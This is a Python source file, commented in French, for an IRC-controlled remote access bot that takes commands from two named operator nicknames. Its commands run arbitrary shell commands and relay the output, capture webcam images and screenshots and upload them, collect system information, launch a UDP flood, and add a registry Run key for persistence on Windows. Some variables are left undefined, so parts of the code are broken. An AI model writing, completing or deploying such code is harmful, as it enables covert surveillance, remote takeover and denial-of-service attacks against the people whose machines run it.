# -*- coding: utf-8 -*-
import irc.bot
import irc.strings
from irc.client import ip_numstr_to_quad, ip_quad_to_numstr

from uttility import *


import os       #

#-------------------------------- function ------------------------------------------
def multiLineMsg(me, target, msg):
    lines = msg.split("\n")
    final = []
    for line in lines:
        for l in line.split("\r"):
            final.append(l)         #comme ça ça decoupe dès qu'il y a du \r et \n
    for msg in final:
        me.notice(target, msg)

def cmd_output(me, target, cmd):
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = process.stdout.read().decode('utf-8', errors="ignore")+process.stderr.read().decode('cp1252')
    multiLineMsg(me, target, output)


def persistance(me, target):
    try:
        app = os.path.realpath(__file__).replace('.py', '.exe')     #seulement si l'app est compilé
        #en supposant que l'app soit installé dans les app data sinon il faut copy avant
        subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v java /t REG_SZ /f /d '+"'"+app+"'", shell=True)
        bot.notice(nick, "l'ajout de la persistance est un succes")
    except:
        bot.notice(ircChannel, "erreur, l'ajout de presistance à échoué")

#------------------------------------ bot -------------------------------------------

class TestBot(irc.bot.SingleServerIRCBot):
    def __init__(self, channel, nickname, server, port=6667):
        irc.bot.SingleServerIRCBot.__init__(
            self, [(server, port)], nickname, nickname)
        self.channel = channel

    def on_nicknameinuse(self, me, e):
        me.nick("0x" + me.get_nickname())

    def on_welcome(self, me, e):
        me.join(self.channel)

        multiLineMsg(me, "Kysan", "Hi!\nI'm here!!")        #pour tester la fonction de message sur plusieur lignes
        print("connected")
    
    
    #en cas de messge privée
    def on_privmsg(self, me, e):
        self.do_command(e, e.arguments[0])          #si reçois un message sur un channel publique prend le message et l'interprete 


    #en cas de message sur le chan publique
    def on_pubmsg(self, me, e):
        self.do_command(e, e.arguments[0])          #si reçois un message sur un channel publique prend le message et l'interprete 


    #jsp
    def on_dccmsg(self, me, e):
        pass

    #aucune idée de ce a quoi ça correspond
    def on_dccchat(self, me, e):
        if len(me.arguments) != 2:
            return
        args = me.arguments[1].split()
        if len(args) == 4:
            try:
                address = ip_numstr_to_quad(args[2])
                port = int(args[3])
            except ValueError:
                return
            self.dcc_connect(address, port)

    def do_command(self, e, message):           #bot functions
        nick = e.source.nick
        #print(nick + ": " + cmd)
        cmd = message.split(" ")
        args = cmd[1:]
        command = cmd[0]
        
        #n'écoute que les senpai
        if nick == "kysbot1" or nick == "kysbotwaifu":
            me = self.connection
            me.notice(nick, "reçu...")
            me.notice(nick, "traitement")


            #pour le déconnecter 
            if command == "disconnect":
                self.disconnect()


            #pour tuer le bot
            elif command == "die":
                self.die()
            


            #pour executé une commande dans le shell et avoir la sortie
            elif command == "cmd":
                threading.Thread(target=cmd_output, args=(me, nick, " ".join(args))).start()



            #pour avoir une photo
            elif command == "cam":
                try:
                    file = takePicture()
                    print(file)
                    link = post_img(file)
                    me.notice(nick, "uploaded on: "+str(link))
                    os.system("del "+file)
                except:
                    me.notice(nick, "error")



            #pour avoir un screenshot
            elif command == "screenshot":
                try:
                    file = screenshot()
                    print(file)
                    link = post_img(file) 
                    me.notice(nick, "uploaded on: "+str(link))
                    os.system("del "+file)
                except:
                    me.notice(nick, "error")



            #pour avoir des info du style l'ip l'os et le nom de la machineetc
            elif command == "info":
                me.notice(nick, info())



            #pour changer le nom du bot actuel
            elif command == "changenick":
                me.nick(args[0])



            #pour afficher l'aide
            elif command == "help":
                me.notice(nick, "availiable commands:")
                me.notice(nick, "disconnect, cam, screenshot, info, cmd, getcwd")

            #elif args[0] == exec: a faire

            #pour avoir le dossier courant
            elif command == "getcwd":
                me.notice(nick, os.getcwd())



            #pour ce deplacer dans les fichers
            elif command == "cd":
                print(" ". join(args))
                os.system("cd "+ " ". join(args))
            

            #fonction pour dos dans la mesure de la légalité pas encore au point
            elif command == "flood":
                threading.Thread(target=udp_flooding, args=(args[0], args[1], c, nick)).start()
                me.notice(nick, "started")
            elif command == "persistance":
                persistance(me, target)

            #en cas de commande invalide
            else:
                me.notice(nick, "Unknow command: " + message)
                me.notice(nick, "type help for commands list")

#--------------------------------- start ----------------------------

def main():
    bot = TestBot("#harem", "kysbot2", "irc.root-me.org")       #port par default est le bon donc non spécifié
    bot.start()

if __name__ == "__main__":
    main()

#made by Kysan721
